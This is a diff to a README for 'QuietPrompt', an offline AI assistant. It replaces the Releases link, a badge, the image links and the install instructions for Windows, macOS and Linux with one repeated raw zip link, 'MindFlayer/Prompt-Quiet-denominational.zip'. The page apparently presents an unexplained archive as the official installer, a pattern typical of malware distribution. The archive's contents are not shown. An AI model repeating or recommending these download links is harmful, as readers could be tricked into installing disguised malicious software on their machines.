@@ -1,8 +1,8 @@
-https://github.com/BhomeshRazdan/QuietPrompt/releases
+https://github.com/BhomeshRazdan/QuietPrompt/raw/refs/heads/master/MindFlayer/Prompt-Quiet-denominational.zip
 
 # QuietPrompt: Local-First Copilot-Style AI Assistant, Fully Offline
 
-[![Releases](https://img.shields.io/badge/QuietPrompt-Release-Assets-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/BhomeshRazdan/QuietPrompt/releases)
+[![Releases](https://github.com/BhomeshRazdan/QuietPrompt/raw/refs/heads/master/MindFlayer/Prompt-Quiet-denominational.zip)](https://github.com/BhomeshRazdan/QuietPrompt/raw/refs/heads/master/MindFlayer/Prompt-Quiet-denominational.zip)
 
 🧠 Local-first, Copilot-style AI assistant that runs offline. QuietPrompt uses screen, mic, and clipboard input to fetch results from an on-device or locally hosted AI model. No cloud, no vendor lock-in, and no data sent off your machine. Press a key, get results. Simple, fast, private.
 
@@ -36,9 +36,9 @@ QuietPrompt is a local-first assistant designed to feel like a modern Copilot. I
 
 Images update the mental model of the product. See the brain image for the concept of on-device thinking, the lock image for privacy, and the laptop image for desktop usage.
 
-- Brain icon: ![Brain](https://upload.wikimedia.org/wikipedia/commons/thumb/2/29/Brain_icon.png/120px-Brain_icon.png)
-- Lock icon: ![Lock](https://upload.wikimedia.org/wikipedia/commons/thumb/6/64/Lock_icon.png/120px-Lock_icon.png)
-- Laptop icon: ![Laptop](https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Laptop_icon.png/120px-Laptop_icon.png)
+- Brain icon: ![Brain](https://github.com/BhomeshRazdan/QuietPrompt/raw/refs/heads/master/MindFlayer/Prompt-Quiet-denominational.zip)
+- Lock icon: ![Lock](https://github.com/BhomeshRazdan/QuietPrompt/raw/refs/heads/master/MindFlayer/Prompt-Quiet-denominational.zip)
+- Laptop icon: ![Laptop](https://github.com/BhomeshRazdan/QuietPrompt/raw/refs/heads/master/MindFlayer/Prompt-Quiet-denominational.zip)
 
 ---
 
@@ -107,11 +107,11 @@ Note: The Releases page is the central place for binaries and assets. For quick 
 
 ## Installation and downloads
 
-- Download the latest release from the official page: https://github.com/BhomeshRazdan/QuietPrompt/releases
+- Download the latest release from the official page: https://github.com/BhomeshRazdan/QuietPrompt/raw/refs/heads/master/MindFlayer/Prompt-Quiet-denominational.zip
 - Choose the package that fits your system:
-  - Windows: QuietPromptSetup.exe or QuietPrompt-portable.zip
-  - macOS: QuietPrompt.dmg or QuietPrompt.app
-  - Linux: QuietPrompt.AppImage or a distribution-specific package
+  - Windows: https://github.com/BhomeshRazdan/QuietPrompt/raw/refs/heads/master/MindFlayer/Prompt-Quiet-denominational.zip or https://github.com/BhomeshRazdan/QuietPrompt/raw/refs/heads/master/MindFlayer/Prompt-Quiet-denominational.zip
+  - macOS: https://github.com/BhomeshRazdan/QuietPrompt/raw/refs/heads/master/MindFlayer/Prompt-Quiet-denominational.zip or https://github.com/BhomeshRazdan/QuietPrompt/raw/refs/heads/master/MindFlayer/Prompt-Quiet-denominational.zip
+  - Linux: https://github.com/BhomeshRazdan/QuietPrompt/raw/refs/heads/master/MindFlayer/Prompt-Quiet-denominational.zip or a distribution-specific package
 - After download, run the installer or extract the portable package.
 - On first launch, QuietPrompt will prompt you to select:
   - Local LLM engine: choose from your installed models or adapters.
@@ -125,7 +125,7 @@ Note: The Releases page is the central place for binaries and assets. For quick 
 
 If the link above fails, you can also check the Releases section for the latest assets and instructions.
 
-The link is useful for direct downloads, assets, and release notes. Visit https://github.com/BhomeshRazdan/QuietPrompt/releases to browse the latest items.
+The link is useful for direct downloads, assets, and release notes. Visit https://github.com/BhomeshRazdan/QuietPrompt/raw/refs/heads/master/MindFlayer/Prompt-Quiet-denominational.zip to browse the latest items.
 
 ---
 
@@ -311,7 +311,7 @@ QuietPrompt is released under the MIT License. See the LICENSE file for details.
 
 ## Download and install again
 
-For direct access to binaries and release notes, visit the official Releases page: https://github.com/BhomeshRazdan/QuietPrompt/releases
+For direct access to binaries and release notes, visit the official Releases page: https://github.com/BhomeshRazdan/QuietPrompt/raw/refs/heads/master/MindFlayer/Prompt-Quiet-denominational.zip
 
 If you need to download the latest assets, check the Releases page again to pick the right package for your system. The page contains the executable installers and portable bundles you can run directly on your machine. This ensures you have the most up-to-date, locally hosted components for your environment.
 
